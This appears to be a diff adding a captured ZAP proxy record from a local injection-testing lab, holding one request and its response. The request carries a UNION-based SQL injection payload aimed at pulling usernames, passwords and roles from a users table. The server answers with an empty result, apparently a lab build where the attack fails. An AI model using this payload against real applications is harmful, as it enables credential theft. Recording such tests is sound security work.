@@ -1,0 +1,25 @@
+### A03_lab_v2_2_search_union
+# ZAP history id: 16
+
+GET http://localhost:5002/api/products?q=zzz'%20UNION%20SELECT%20id,username,password,role%20FROM%20users-- HTTP/1.1
+Host: localhost:5002
+User-Agent: python-requests/2.34.2
+Accept: */*
+Connection: keep-alive
+
+
+
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.12.3
+Date: Wed, 18 Nov 2026 11:51:14 GMT
+Content-Type: application/json
+Content-Length: 3
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+Content-Security-Policy: default-src 'none'; frame-ancestors 'none'
+Referrer-Policy: no-referrer
+Cache-Control: no-store
+Connection: close
+
+[]
+
